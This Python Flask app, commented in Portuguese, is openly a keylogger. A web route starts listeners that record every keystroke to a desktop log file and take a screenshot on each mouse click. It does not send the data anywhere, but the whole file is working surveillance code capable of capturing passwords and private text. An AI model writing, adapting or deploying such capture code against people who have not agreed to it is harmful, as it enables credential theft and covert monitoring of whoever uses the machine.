from flask import Flask, render_template
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener, Key
from datetime import datetime
import os
import pyautogui as py

app = Flask(__name__)

# Caminho para a área de trabalho do usuário
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

# Define um diretório para armazenar os logs e screenshots na área de trabalho
data_dir = os.path.join(desktop, 'KeyloggerData')
log_dir = os.path.join(data_dir, 'logs')
screenshot_dir = os.path.join(data_dir, 'screenshots')

# Cria os diretórios se não existirem
os.makedirs(log_dir, exist_ok=True)
os.makedirs(screenshot_dir, exist_ok=True)

# Arquivo de log para as teclas pressionadas
log_file = os.path.join(log_dir, 'Keylogger.log')

# Função para capturar teclas
def on_press(key):
    print(f'Tecla pressionada: {key}')  # Adicionando impressão para depuração
    with open(log_file, 'a') as log:
        try:
            if hasattr(key, 'char') and key.char is not None:  # Verifica se é uma letra ou número
                log.write(key.char)
            elif key == Key.space:
                log.write(' ')  # Adiciona um espaço
            elif key == Key.enter:
                log.write('\n')  # Nova linha
            elif key == Key.tab:
                log.write('\t')  # Adiciona uma tabulação
        except Exception as e:
            print(f"Erro ao capturar tecla: {e}")

# Função para capturar cliques do mouse
def on_click(x, y, button, pressed):
    if pressed:
        screenshot = py.screenshot()
        timestamp = datetime.now().strftime("%H-%M-%S")
        screenshot.save(os.path.join(screenshot_dir, f"printKeylogger_{timestamp}.jpg"))

# Inicia os listeners
keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener = MouseListener(on_click=on_click)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    keyboard_listener.start()
    mouse_listener.start()
    return "Keylogger e screenshot iniciados."

if __name__ == '__main__':
    app.run(debug=True)
